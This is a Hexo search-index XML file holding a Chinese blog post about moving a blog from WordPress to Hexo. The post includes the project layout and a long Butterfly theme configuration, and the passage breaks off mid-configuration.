<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hi Hexo!</title>
      <link href="333a4773e2de/"/>
      <url>333a4773e2de/</url>
      
        <content type="html"><![CDATA[<h1 id="Hi-Hexo"><a href="#Hi-Hexo" class="headerlink" title="Hi Hexo!"></a>Hi Hexo!</h1><p>经过多年的心理斗争，从知道Hexo这个东西到今天终于迁移到了Hexo得有好几年了，期间被<code>@Mattshi</code> 多次安利，也因为Wordpress越来越慢越来越笨重，打开wp-admin都要等好久，终于忍受不了迁移到了Hexo。<br>这里记录了迁移过程中遇到的问题以及我自己记录的一些内容。</p><h2 id="1-导出Wordpress中的旧文章和图片"><a href="#1-导出Wordpress中的旧文章和图片" class="headerlink" title="1. 导出Wordpress中的旧文章和图片"></a>1. 导出Wordpress中的旧文章和图片</h2><p>这里我没用Hexo官方推荐的迁移工具，那个工具属实不好用，只能导出文章，而且导出了之后也有一些Syntax问题。<br><a href="https://github.com/lonekorean/wordpress-export-to-markdown">https://github.com/lonekorean/wordpress-export-to-markdown</a><br>这个工具不仅能导出文章，还能把wordpress上的图片远程离线到本地，肥肠的方便。</p><h2 id="2-安装nodejs和Hexo"><a href="#2-安装nodejs和Hexo" class="headerlink" title="2. 安装nodejs和Hexo"></a>2. 安装nodejs和Hexo</h2><p>我本地的环境是Centos7，直接用yum装会有点问题，推荐去官网下载rpm安装包安装。<br>安装Hexo和本地环境就不多说了，照着官方教程不会有问题。</p><h2 id="3-配置Hexo"><a href="#3-配置Hexo" class="headerlink" title="3. 配置Hexo"></a>3. 配置Hexo</h2><p>这里算是比较复杂和容易出问题的地方，因为我也是第一次操作，所以遇到了一些坑。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.butterfly.yml   // 主题配置文件，需要从themes里面复制出来放到这里</span><br><span class="line">├── _config.landscape.yml</span><br><span class="line">├── _config.yml   // Hexo配置文件</span><br><span class="line">├── db.json</span><br><span class="line">├── node_modules</span><br><span class="line">├── package.json</span><br><span class="line">├── package-lock.json</span><br><span class="line">├── public   // Hexo自己生成的静态资源</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source   // 源文件，包括图片和文章等等</span><br><span class="line">└── themes   // 主题文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>_config.butterfly.yml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Main menu navigation (導航目錄)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># format: name: link || icon</span><br><span class="line"># sub-menu</span><br><span class="line"># name || icon:</span><br><span class="line">#   name: link || icon</span><br><span class="line"></span><br><span class="line">menu:</span><br><span class="line">  Home: / || fas fa-home</span><br><span class="line">  # Archives: /archives/ || fas fa-archive</span><br><span class="line">  # Tags: /tags/ || fas fa-tags</span><br><span class="line">  Categories: /categories/ || fas fa-folder-open</span><br><span class="line">  # List||fas fa-list:</span><br><span class="line">  #   Music: /music/ || fas fa-music</span><br><span class="line">  #   Movie: /movies/ || fas fa-video</span><br><span class="line">  Link: /link/ || fas fa-link</span><br><span class="line">  About: /about/ || fas fa-heart</span><br><span class="line"></span><br><span class="line"># Hide the child menu items in mobile sidebar</span><br><span class="line">hide_sidebar_menu_child: false</span><br><span class="line"></span><br><span class="line"># Code Blocks (代碼相關)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line">highlight_theme: mac #  darker / pale night / light / ocean / mac / mac light / false</span><br><span class="line">highlight_copy: true # copy button</span><br><span class="line">highlight_lang: true # show the code language</span><br><span class="line">highlight_shrink: false # true: shrink the code blocks / false: expand the code blocks | none: expand code blocks and hide the button</span><br><span class="line">highlight_height_limit: 500 # unit: px</span><br><span class="line">code_word_wrap: true</span><br><span class="line"></span><br><span class="line"># copy settings</span><br><span class="line"># copyright: Add the copyright information after copied content (複製的內容後面加上版權信息)</span><br><span class="line">copy:</span><br><span class="line">  enable: true</span><br><span class="line">  copyright:</span><br><span class="line">    enable: false</span><br><span class="line">    limit_count: 50</span><br><span class="line"></span><br><span class="line"># social settings (社交圖標設置)</span><br><span class="line"># formal:</span><br><span class="line">#   icon: link || the description</span><br><span class="line">social:</span><br><span class="line">  fab fa-github: https://github.com/jindom || Github</span><br><span class="line">  fas fa-envelope: mailto:jinzz@jinzz.cc || Email</span><br><span class="line"></span><br><span class="line"># search (搜索)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Algolia search</span><br><span class="line">algolia_search:</span><br><span class="line">  enable: false</span><br><span class="line">  hits:</span><br><span class="line">    per_page: 6</span><br><span class="line"></span><br><span class="line"># Local search</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line"># Math (數學)</span><br><span class="line"># --------------------------------------</span><br><span class="line"># About the per_page</span><br><span class="line"># if you set it to true, it will load mathjax/katex script in each page (true 表示每一頁都加載js)</span><br><span class="line"># if you set it to false, it will load mathjax/katex script according to your setting (add the &#x27;mathjax: true&#x27; in page&#x27;s front-matter)</span><br><span class="line"># (false 需要時加載，須在使用的 Markdown Front-matter 加上 mathjax: true)</span><br><span class="line"></span><br><span class="line"># MathJax</span><br><span class="line">mathjax:</span><br><span class="line">  enable: false</span><br><span class="line">  per_page: false</span><br><span class="line"></span><br><span class="line"># KaTeX</span><br><span class="line">katex:</span><br><span class="line">  enable: false</span><br><span class="line">  per_page: false</span><br><span class="line">  hide_scrollbar: true</span><br><span class="line"></span><br><span class="line"># Image (圖片設置)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Favicon（網站圖標）</span><br><span class="line">favicon: /images/favicon.png</span><br><span class="line"></span><br><span class="line"># Avatar (頭像)</span><br><span class="line">avatar:</span><br><span class="line">  img: /images/avatar.png</span><br><span class="line">  effect: false</span><br><span class="line"></span><br><span class="line"># Disable all banner image</span><br><span class="line">disable_top_img: false</span><br><span class="line"></span><br><span class="line"># The banner image of home page</span><br><span class="line">index_img: /images/index.png</span><br><span class="line"></span><br><span class="line"># If the banner of page not setting, it will show the top_img</span><br><span class="line">default_top_img: /images/index.png</span><br><span class="line"></span><br><span class="line"># The banner image of archive page</span><br><span class="line">archive_img:</span><br><span class="line"></span><br><span class="line"># If the banner of tag page not setting, it will show the top_img</span><br><span class="line"># note: tag page, not tags page (子標籤頁面的 top_img)</span><br><span class="line">tag_img:</span><br><span class="line"></span><br><span class="line"># The banner image of tag page</span><br><span class="line"># format:</span><br><span class="line">#  - tag name: xxxxx</span><br><span class="line">tag_per_img:</span><br><span class="line"></span><br><span class="line"># If the banner of category page not setting, it will show the top_img</span><br><span class="line"># note: category page, not categories page (子分類頁面的 top_img)</span><br><span class="line">category_img:</span><br><span class="line"></span><br><span class="line"># The banner image of category page</span><br><span class="line"># format:</span><br><span class="line">#  - category name: xxxxx</span><br><span class="line">category_per_img:</span><br><span class="line"></span><br><span class="line">cover:</span><br><span class="line">  # display the cover or not (是否顯示文章封面)</span><br><span class="line">  index_enable: true</span><br><span class="line">  aside_enable: true</span><br><span class="line">  archives_enable: true</span><br><span class="line">  # the position of cover in home page (封面顯示的位置)</span><br><span class="line">  # left/right/both</span><br><span class="line">  position: both</span><br><span class="line">  # When cover is not set, the default cover is displayed (當沒有設置cover時，默認的封面顯示)</span><br><span class="line">  default_cover:</span><br><span class="line">    - /images/cover1.jpg</span><br><span class="line">    - /images/cover2.jpg</span><br><span class="line">    - /images/cover3.jpg</span><br><span class="line">    - /images/cover4.jpg</span><br><span class="line">    - /images/cover5.jpg</span><br><span class="line">    - /images/cover6.jpg</span><br><span class="line">    - /images/cover7.jpg</span><br><span class="line">    - /images/cover8.jpg</span><br><span class="line">    - /images/cover9.jpg</span><br><span class="line">    - /images/cover10.jpg</span><br><span class="line">    - /images/cover11.jpg</span><br><span class="line">    - /images/cover12.jpg</span><br><span class="line">    - /images/cover13.jpg</span><br><span class="line">    - /images/cover14.jpg</span><br><span class="line">    - /images/cover15.jpg</span><br><span class="line">    - /images/cover16.jpg</span><br><span class="line">    - /images/cover17.jpg</span><br><span class="line">    - /images/cover18.jpg</span><br><span class="line">    - /images/cover19.jpg</span><br><span class="line">    - /images/cover20.jpg</span><br><span class="line">    # - https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg</span><br><span class="line"></span><br><span class="line"># Replace Broken Images (替換無法顯示的圖片)</span><br><span class="line">error_img:</span><br><span class="line">  flink: /img/friend_404.gif</span><br><span class="line">  post_page: /img/404.jpg</span><br><span class="line"></span><br><span class="line"># A simple 404 page</span><br><span class="line">error_404:</span><br><span class="line">  enable: true</span><br><span class="line">  subtitle: &#x27;Page Not Found&#x27;</span><br><span class="line">  background: https://i.loli.net/2020/05/19/aKOcLiyPl2JQdFD.png</span><br><span class="line"></span><br><span class="line">post_meta:</span><br><span class="line">  page: # Home Page</span><br><span class="line">    date_type: created # created or updated or both 主頁文章日期是創建日或者更新日或都顯示</span><br><span class="line">    date_format: date # date/relative 顯示日期還是相對日期</span><br><span class="line">    categories: true # true or false 主頁是否顯示分類</span><br><span class="line">    tags: false # true or false 主頁是否顯示標籤</span><br><span class="line">    label: true # true or false 顯示描述性文字</span><br><span class="line">  post:</span><br><span class="line">    date_type: both # created or updated or both 文章頁日期是創建日或者更新日或都顯示</span><br><span class="line">    date_format: date # date/relative 顯示日期還是相對日期</span><br><span class="line">    categories: true # true or false 文章頁是否顯示分類</span><br><span class="line">    tags: true # true or false 文章頁是否顯示標籤</span><br><span class="line">    label: true # true or false 顯示描述性文字</span><br><span class="line"></span><br><span class="line"># wordcount (字數統計)</span><br><span class="line">wordcount:</span><br><span class="line">  enable: false</span><br><span class="line">  post_wordcount: true</span><br><span class="line">  min2read: true</span><br><span class="line">  total_wordcount: true</span><br><span class="line"></span><br><span class="line"># Display the article introduction on homepage</span><br><span class="line"># 1: description</span><br><span class="line"># 2: both (if the description exists, it will show description, or show the auto_excerpt)</span><br><span class="line"># 3: auto_excerpt (default)</span><br><span class="line"># false: do not show the article introduction</span><br><span class="line">index_post_content:</span><br><span class="line">  method: 3</span><br><span class="line">  length: 500 # if you set method to 2 or 3, the length need to config</span><br><span class="line"></span><br><span class="line"># Post</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># toc (目錄)</span><br><span class="line">toc:</span><br><span class="line">  enable: true</span><br><span class="line">  number: true</span><br><span class="line">  style_simple: false</span><br><span class="line"></span><br><span class="line">post_copyright:</span><br><span class="line">  enable: true</span><br><span class="line">  decode: false</span><br><span class="line">  license: CC BY-NC-SA 4.0</span><br><span class="line">  license_url: https://creativecommons.org/licenses/by-nc-sa/4.0/</span><br><span class="line"></span><br><span class="line"># Sponsor/reward</span><br><span class="line">reward:</span><br><span class="line">  enable: false</span><br><span class="line">  QR_code:</span><br><span class="line">    # - img: /img/wechat.jpg</span><br><span class="line">    #   link:</span><br><span class="line">    #   text: wechat</span><br><span class="line">    # - img: /img/alipay.jpg</span><br><span class="line">    #   link:</span><br><span class="line">    #   text: alipay</span><br><span class="line"></span><br><span class="line"># Post edit</span><br><span class="line"># Easily browse and edit blog source code online.</span><br><span class="line">post_edit:</span><br><span class="line">  enable: false</span><br><span class="line">  # url: https://github.com/user-name/repo-name/edit/branch-name/subdirectory-name/</span><br><span class="line">  # For example: https://github.com/jerryc127/butterfly.js.org/edit/main/source/</span><br><span class="line">  url:</span><br><span class="line"></span><br><span class="line"># Related Articles</span><br><span class="line">related_post:</span><br><span class="line">  enable: true</span><br><span class="line">  limit: 6 # Number of posts displayed</span><br><span class="line">  date_type: created # or created or updated 文章日期顯示創建日或者更新日</span><br><span class="line"></span><br><span class="line"># figcaption (圖片描述文字)</span><br><span class="line">photofigcaption: false</span><br><span class="line"></span><br><span class="line"># post_pagination (分頁)</span><br><span class="line"># value: 1 || 2 || false</span><br><span class="line"># 1: The &#x27;next post&#x27; will link to old post</span><br><span class="line"># 2: The &#x27;next post&#x27; will link to new post</span><br><span class="line"># false: disable pagination</span><br><span class="line">post_pagination: 1</span><br><span class="line"></span><br><span class="line"># anchor</span><br><span class="line"># when you scroll in post, the URL will update according to header id.</span><br><span class="line">anchor: false</span><br><span class="line"></span><br><span class="line"># Displays outdated notice for a post (文章過期提醒)</span><br><span class="line">noticeOutdate:</span><br><span class="line">  enable: false</span><br><span class="line">  style: flat # style: simple/flat</span><br><span class="line">  limit_day: 500 # When will it be shown</span><br><span class="line">  position: top # position: top/bottom</span><br><span class="line">  message_prev: It has been</span><br><span class="line">  message_next: days since the last update, the content of the article may be outdated.</span><br><span class="line"></span><br><span class="line"># Share System (分享功能)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># AddThis</span><br><span class="line"># https://www.addthis.com/</span><br><span class="line">addThis:</span><br><span class="line">  enable: false</span><br><span class="line">  pubid:</span><br><span class="line"></span><br><span class="line"># Share.js</span><br><span class="line"># https://github.com/overtrue/share.js</span><br><span class="line">sharejs:</span><br><span class="line">  enable: true</span><br><span class="line">  sites: facebook,twitter,wechat,weibo,qq</span><br><span class="line"></span><br><span class="line"># AddToAny</span><br><span class="line"># https://www.addtoany.com/</span><br><span class="line">addtoany:</span><br><span class="line">  enable: false</span><br><span class="line">  item: facebook,twitter,wechat,sina_weibo,facebook_messenger,email,copy_link</span><br><span class="line"></span><br><span class="line"># Comments System</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line">comments:</span><br><span class="line">  # Up to two comments system, the first will be shown as default</span><br><span class="line">  # Choose: Disqus/Disqusjs/Livere/Gitalk/Valine/Waline/Utterances/Facebook Comments/Twikoo</span><br><span class="line">  use:</span><br><span class="line">  # - Valine</span><br><span class="line">  # - Disqus</span><br><span class="line">  text: true # Display the comment name next to the button</span><br><span class="line">  # lazyload: The comment system will be load when comment element enters the browser&#x27;s viewport.</span><br><span class="line">  # If you set it to true, the comment count will be invalid</span><br><span class="line">  lazyload: false</span><br><span class="line">  count: false # Display comment count in post&#x27;s top_img</span><br><span class="line">  card_post_count: false # Display comment count in Home Page</span><br><span class="line"></span><br><span class="line"># disqus</span><br><span class="line"># https://disqus.com/</span><br><span class="line">disqus:</span><br><span class="line">  shortname:</span><br><span class="line"></span><br><span class="line"># Alternative Disqus - Render comments with Disqus API</span><br><span class="line"># DisqusJS 評論系統，可以實現在網路審查地區載入 Disqus 評論列表，兼容原版</span><br><span class="line"># https://github.com/SukkaW/DisqusJS</span><br><span class="line">disqusjs:</span><br><span class="line">  shortname:</span><br><span class="line">  siteName:</span><br><span class="line">  apikey:</span><br><span class="line">  api:</span><br><span class="line">  nocomment: # display when a blog post or an article has no comment attached</span><br><span class="line">  admin:</span><br><span class="line">  adminLabel:</span><br><span class="line"></span><br><span class="line"># livere (來必力)</span><br><span class="line"># https://www.livere.com/</span><br><span class="line">livere:</span><br><span class="line">  uid:</span><br><span class="line"></span><br><span class="line"># gitalk</span><br><span class="line"># https://github.com/gitalk/gitalk</span><br><span class="line">gitalk:</span><br><span class="line">  client_id:</span><br><span class="line">  client_secret:</span><br><span class="line">  repo:</span><br><span class="line">  owner:</span><br><span class="line">  admin:</span><br><span class="line">  language: en # en, zh-CN, zh-TW, es-ES, fr, ru</span><br><span class="line">  perPage: 10 # Pagination size, with maximum 100.</span><br><span class="line">  distractionFreeMode: false # Facebook-like distraction free mode.</span><br><span class="line">  pagerDirection: last # Comment sorting direction, available values are last and first.</span><br><span class="line">  createIssueManually: false # Gitalk will create a corresponding github issue for your every single page automatically</span><br><span class="line">  option:</span><br><span class="line"></span><br><span class="line"># valine</span><br><span class="line"># https://valine.js.org</span><br><span class="line">valine:</span><br><span class="line">  appId: # leancloud application app id</span><br><span class="line">  appKey: # leancloud application app key</span><br><span class="line">  pageSize: 10 # comment list page size</span><br><span class="line">  avatar: monsterid # gravatar style https://valine.js.org/#/avatar</span><br><span class="line">  lang: en # i18n: zh-CN/zh-TW/en/ja</span><br><span class="line">  placeholder: Please leave your footprints # valine comment input placeholder (like: Please leave your footprints)</span><br><span class="line">  guest_info: nick,mail,link # valine comment header info (nick/mail/link)</span><br><span class="line">  recordIP: false # Record reviewer IP</span><br><span class="line">  serverURLs: # This configuration is suitable for domestic custom domain name users, overseas version will be automatically detected (no need to manually fill in)</span><br><span class="line">  bg: # valine background</span><br><span class="line">  emojiCDN: # emoji CDN</span><br><span class="line">  enableQQ: false # enable the Nickname box to automatically get QQ Nickname and QQ Avatar</span><br><span class="line">  requiredFields: nick,mail # required fields (nick/mail)</span><br><span class="line">  visitor: false</span><br><span class="line">  option:</span><br><span class="line"></span><br><span class="line"># waline - A simple comment system with backend support fork from Valine</span><br><span class="line"># https://waline.js.org/</span><br><span class="line">waline:</span><br><span class="line">  serverURL: # Waline server address url</span><br><span class="line">  avatar: monsterid # gravatar style https://zh-tw.gravatar.com/site/implement/images/#default-image</span><br><span class="line">  emojiCDN: # emoji CDN</span><br><span class="line">  bg: # waline background</span><br><span class="line">  visitor: false</span><br><span class="line">  option:</span><br><span class="line"></span><br><span class="line"># utterances</span><br><span class="line"># https://utteranc.es/</span><br><span class="line">utterances:</span><br><span class="line">  repo:</span><br><span class="line">  # Issue Mapping: pathname/url/title/og:title</span><br><span class="line">  issue_term: pathname</span><br><span class="line">  # Theme: github-light/github-dark/github-dark-orange/icy-dark/dark-blue/photon-dark</span><br><span class="line">  light_theme: github-light</span><br><span class="line">  dark_theme: photon-dark</span><br><span class="line"></span><br><span class="line"># Facebook Comments Plugin</span><br><span class="line"># https://developers.facebook.com/docs/plugins/comments/</span><br><span class="line">facebook_comments:</span><br><span class="line">  app_id:</span><br><span class="line">  user_id: # optional</span><br><span class="line">  pageSize: 10 # The number of comments to show</span><br><span class="line">  order_by: social # social/time/reverse_time</span><br><span class="line">  lang: en_US # Language en_US/zh_CN/zh_TW and so on</span><br><span class="line"></span><br><span class="line"># Twikoo</span><br><span class="line"># https://github.com/imaegoo/twikoo</span><br><span class="line">twikoo:</span><br><span class="line">  envId:</span><br><span class="line">  region:</span><br><span class="line">  visitor: false</span><br><span class="line">  option:</span><br><span class="line"></span><br><span class="line"># Chat Services</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Chat Button [recommend]</span><br><span class="line"># It will create a button in the bottom right corner of website, and hide the origin button</span><br><span class="line">chat_btn: true</span><br><span class="line"></span><br><span class="line"># The origin chat button is displayed when scrolling up, and the button is hidden when scrolling down</span><br><span class="line">chat_hide_show: true</span><br><span class="line"></span><br><span class="line"># chatra</span><br><span class="line"># https://chatra.io/</span><br><span class="line">chatra:</span><br><span class="line">  enable: false</span><br><span class="line">  id:</span><br><span class="line"></span><br><span class="line"># tidio</span><br><span class="line"># https://www.tidio.com/</span><br><span class="line">tidio:</span><br><span class="line">  enable: true</span><br><span class="line">  public_key: eucyopvw8zt034ovoshroc4kci4qpweh</span><br><span class="line"></span><br><span class="line"># daovoice</span><br><span class="line"># http://daovoice.io/</span><br><span class="line">daovoice:</span><br><span class="line">  enable: false</span><br><span class="line">  app_id:</span><br><span class="line"></span><br><span class="line"># gitter</span><br><span class="line"># https://gitter.im/</span><br><span class="line">gitter:</span><br><span class="line">  enable: false</span><br><span class="line">  room:</span><br><span class="line"></span><br><span class="line"># crisp</span><br><span class="line"># https://crisp.chat/en/</span><br><span class="line">crisp:</span><br><span class="line">  enable: false</span><br><span class="line">  website_id:</span><br><span class="line"></span><br><span class="line"># Footer Settings</span><br><span class="line"># --------------------------------------</span><br><span class="line">footer:</span><br><span class="line">  owner:</span><br><span class="line">    enable: true</span><br><span class="line">    since: 1949</span><br><span class="line">  custom_text:</span><br><span class="line">  copyright: true # Copyright of theme and framework</span><br><span class="line"></span><br><span class="line"># Analysis</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Baidu Analytics</span><br><span class="line"># https://tongji.baidu.com/web/welcome/login</span><br><span class="line">baidu_analytics:</span><br><span class="line"></span><br><span class="line"># Google Analytics</span><br><span class="line"># https://analytics.google.com/analytics/web/</span><br><span class="line">google_analytics:</span><br><span class="line"></span><br><span class="line"># Tencent Analytics ID</span><br><span class="line"># https://mta.qq.com</span><br><span class="line">tencent_analytics:</span><br><span class="line"></span><br><span class="line"># CNZZ Analytics</span><br><span class="line"># https://www.umeng.com/</span><br><span class="line">cnzz_analytics:</span><br><span class="line"></span><br><span class="line"># Cloudflare Analytics</span><br><span class="line"># https://www.cloudflare.com/zh-tw/web-analytics/</span><br><span class="line">cloudflare_analytics:</span><br><span class="line"></span><br><span class="line"># Microsoft Clarity</span><br><span class="line"># https://clarity.microsoft.com/</span><br><span class="line">microsoft_clarity:</span><br><span class="line"></span><br><span class="line"># Advertisement</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Google Adsense (谷歌廣告)</span><br><span class="line">google_adsense:</span><br><span class="line">  enable: false</span><br><span class="line">  auto_ads: true</span><br><span class="line">  js: https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js</span><br><span class="line">  client:</span><br><span class="line">  enable_page_level_ads: true</span><br><span class="line"></span><br><span class="line"># Insert ads manually (手動插入廣告)</span><br><span class="line"># ad:</span><br><span class="line">#   index:</span><br><span class="line">#   aside:</span><br><span class="line">#   post:</span><br><span class="line"></span><br><span class="line"># Verification (站長驗證)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line">site_verification:</span><br><span class="line">  # - name: google_site_verification</span><br><span class="line">  #   content: xxxxxx</span><br><span class="line">  # - name: baidu_site_verification</span><br><span class="line">  #   content: xxxxxxx</span><br><span class="line"></span><br><span class="line"># Beautify/Effect (美化/效果)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Theme color for customize</span><br><span class="line"># Notice: color value must in double quotes like &quot;#000&quot; or may cause error!</span><br><span class="line"></span><br><span class="line"># theme_color:</span><br><span class="line">#   enable: true</span><br><span class="line">#   main: &quot;#49B1F5&quot;</span><br><span class="line">#   paginator: &quot;#00c4b6&quot;</span><br><span class="line">#   button_hover: &quot;#FF7242&quot;</span><br><span class="line">#   text_selection: &quot;#00c4b6&quot;</span><br><span class="line">#   link_color: &quot;#99a9bf&quot;</span><br><span class="line">#   meta_color: &quot;#858585&quot;</span><br><span class="line">#   hr_color: &quot;#A4D8FA&quot;</span><br><span class="line">#   code_foreground: &quot;#F47466&quot;</span><br><span class="line">#   code_background: &quot;rgba(27, 31, 35, .05)&quot;</span><br><span class="line">#   toc_color: &quot;#00c4b6&quot;</span><br><span class="line">#   blockquote_padding_color: &quot;#49b1f5&quot;</span><br><span class="line">#   blockquote_background_color: &quot;#49b1f5&quot;</span><br><span class="line"></span><br><span class="line"># The top_img settings of home page</span><br><span class="line"># default: top img - full screen, site info - middle (默認top_img全屏，site_info在中間)</span><br><span class="line"># The position of site info, eg: 300px/300em/300rem/10% (主頁標題距離頂部距離)</span><br><span class="line">index_site_info_top:</span><br><span class="line"># The height of top_img, eg: 300px/300em/300rem (主頁top_img高度)</span><br><span class="line">index_top_img_height:</span><br><span class="line"></span><br><span class="line"># The user interface setting of category and tag page (category和tag頁的UI設置)</span><br><span class="line"># index - same as Homepage UI (index 值代表 UI將與首頁的UI一樣)</span><br><span class="line"># default - same as archives UI 默認跟archives頁面UI一樣</span><br><span class="line">category_ui: # 留空或 index</span><br><span class="line">tag_ui: # 留空或 index</span><br><span class="line"></span><br><span class="line"># Website Background (設置網站背景)</span><br><span class="line"># can set it to color or image (可設置圖片 或者 顔色)</span><br><span class="line"># The formal of image: url(http://xxxxxx.com/xxx.jpg)</span><br><span class="line">background:</span><br><span class="line"></span><br><span class="line"># Footer Background</span><br><span class="line">footer_bg: false</span><br><span class="line"></span><br><span class="line"># the position of bottom right button/default unit: px (右下角按鈕距離底部的距離/默認單位為px)</span><br><span class="line">rightside-bottom:</span><br><span class="line"></span><br><span class="line"># Enter transitions (開啓網頁進入效果)</span><br><span class="line">enter_transitions: true</span><br><span class="line"></span><br><span class="line"># Background effects (背景特效)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># canvas_ribbon (靜止彩帶背景)</span><br><span class="line"># See: https://github.com/hustcc/ribbon.js</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: true</span><br><span class="line">  size: 150</span><br><span class="line">  alpha: 0.6</span><br><span class="line">  zIndex: -1</span><br><span class="line">  click_to_change: false</span><br><span class="line">  mobile: true</span><br><span class="line"></span><br><span class="line"># Fluttering Ribbon (動態彩帶)</span><br><span class="line">canvas_fluttering_ribbon:</span><br><span class="line">  enable: true</span><br><span class="line">  mobile: true</span><br><span class="line"></span><br><span class="line"># canvas_nest</span><br><span class="line"># https://github.com/hustcc/canvas-nest.js</span><br><span class="line">canvas_nest:</span><br><span class="line">  enable: false</span><br><span class="line">  color: &#x27;0,0,255&#x27; #color of lines, default: &#x27;0,0,0&#x27;; RGB values: (R,G,B).(note: use &#x27;,&#x27; to separate.)</span><br><span class="line">  opacity: 0.7 # the opacity of line (0~1), default: 0.5.</span><br><span class="line">  zIndex: -1 # z-index property of the background, default: -1.</span><br><span class="line">  count: 99 # the number of lines, default: 99.</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Typewriter Effect (打字效果)</span><br><span class="line"># https://github.com/disjukr/activate-power-mode</span><br><span class="line">activate_power_mode:</span><br><span class="line">  enable: true</span><br><span class="line">  colorful: true # open particle animation (冒光特效)</span><br><span class="line">  shake: true #  open shake (抖動特效)</span><br><span class="line">  mobile: true</span><br><span class="line"></span><br><span class="line"># Mouse click effects: fireworks (鼠標點擊效果: 煙火特效)</span><br><span class="line">fireworks:</span><br><span class="line">  enable: false</span><br><span class="line">  zIndex: 9999 # -1 or 9999</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Mouse click effects: Heart symbol (鼠標點擊效果: 愛心)</span><br><span class="line">click_heart:</span><br><span class="line">  enable: true</span><br><span class="line">  mobile: true</span><br><span class="line"></span><br><span class="line"># Mouse click effects: words (鼠標點擊效果: 文字)</span><br><span class="line">ClickShowText:</span><br><span class="line">  enable: false</span><br><span class="line">  text:</span><br><span class="line">    # - I</span><br><span class="line">    # - LOVE</span><br><span class="line">    # - YOU</span><br><span class="line">  fontSize: 15px</span><br><span class="line">  random: false</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Default display mode (網站默認的顯示模式)</span><br><span class="line"># light (default) / dark</span><br><span class="line">display_mode: dark</span><br><span class="line"></span><br><span class="line"># Beautify (美化頁面顯示)</span><br><span class="line">beautify:</span><br><span class="line">  enable: true</span><br><span class="line">  field: site # site/post</span><br><span class="line">  title-prefix-icon: &#x27;\f0c1&#x27;</span><br><span class="line">  title-prefix-icon-color: &#x27;#F47466&#x27;</span><br><span class="line"></span><br><span class="line"># Global font settings</span><br><span class="line"># Don&#x27;t modify the following settings unless you know how they work (非必要不要修改)</span><br><span class="line">font:</span><br><span class="line">  global-font-size:</span><br><span class="line">  code-font-size:</span><br><span class="line">  font-family:</span><br><span class="line">  code-font-family:</span><br><span class="line"></span><br><span class="line"># Font settings for the site title and site subtitle</span><br><span class="line"># 左上角網站名字 主頁居中網站名字</span><br><span class="line">blog_title_font:</span><br><span class="line">  font_link:</span><br><span class="line">  font-family:</span><br><span class="line"></span><br><span class="line"># The setting of divider icon (水平分隔線圖標設置)</span><br><span class="line">hr_icon:</span><br><span class="line">  enable: true</span><br><span class="line">  icon: # the unicode value of Font Awesome icon, such as &#x27;\3423&#x27;</span><br><span class="line">  icon-top:</span><br><span class="line"></span><br><span class="line"># the subtitle on homepage (主頁subtitle)</span><br><span class="line">subtitle:</span><br><span class="line">  enable: false</span><br><span class="line">  # Typewriter Effect (打字效果)</span><br><span class="line">  effect: true</span><br><span class="line">  # loop (循環打字)</span><br><span class="line">  loop: false</span><br><span class="line">  # source調用第三方服務</span><br><span class="line">  # source: false 關閉調用</span><br><span class="line">  # source: 1  調用搏天api的隨機語錄（簡體）</span><br><span class="line">  # source: 2  調用一言網的一句話（簡體）</span><br><span class="line">  # source: 3  調用一句網（簡體）</span><br><span class="line">  # source: 4  調用今日詩詞（簡體）</span><br><span class="line">  # subtitle 會先顯示 source , 再顯示 sub 的內容</span><br><span class="line">  source: false</span><br><span class="line">  # 如果有英文逗號&#x27; , &#x27;,請使用轉義字元 &amp;#44;</span><br><span class="line">  # 如果有英文雙引號&#x27; &quot; &#x27;,請使用轉義字元 &amp;quot;</span><br><span class="line">  # 開頭不允許轉義字元，如需要，請把整個句子用雙引號包住</span><br><span class="line">  # 如果關閉打字效果，subtitle只會顯示sub的第一行文字</span><br><span class="line">  sub:</span><br><span class="line"></span><br><span class="line"># Loading Animation (加載動畫)</span><br><span class="line">preloader: true</span><br><span class="line"></span><br><span class="line"># aside (側邊欄)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line">aside:</span><br><span class="line">  enable: true</span><br><span class="line">  hide: false</span><br><span class="line">  button: true</span><br><span class="line">  mobile: true # display on mobile</span><br><span class="line">  position: right # left or right</span><br><span class="line">  card_author:</span><br><span class="line">    enable: true</span><br><span class="line">    description:</span><br><span class="line">    button:</span><br><span class="line">      enable: true</span><br><span class="line">      icon: fab fa-github</span><br><span class="line">      text: Follow Me</span><br><span class="line">      link: https://github.com/jindom</span><br><span class="line">  card_announcement:</span><br><span class="line">    enable: false</span><br><span class="line">    content: Test</span><br><span class="line">  card_recent_post:</span><br><span class="line">    enable: true</span><br><span class="line">    limit: 5 # if set 0 will show all</span><br><span class="line">    sort: date # date or updated</span><br><span class="line">    sort_order: # Don&#x27;t modify the setting unless you know how it works</span><br><span class="line">  card_categories:</span><br><span class="line">    enable: true</span><br><span class="line">    limit: 8 # if set 0 will show all</span><br><span 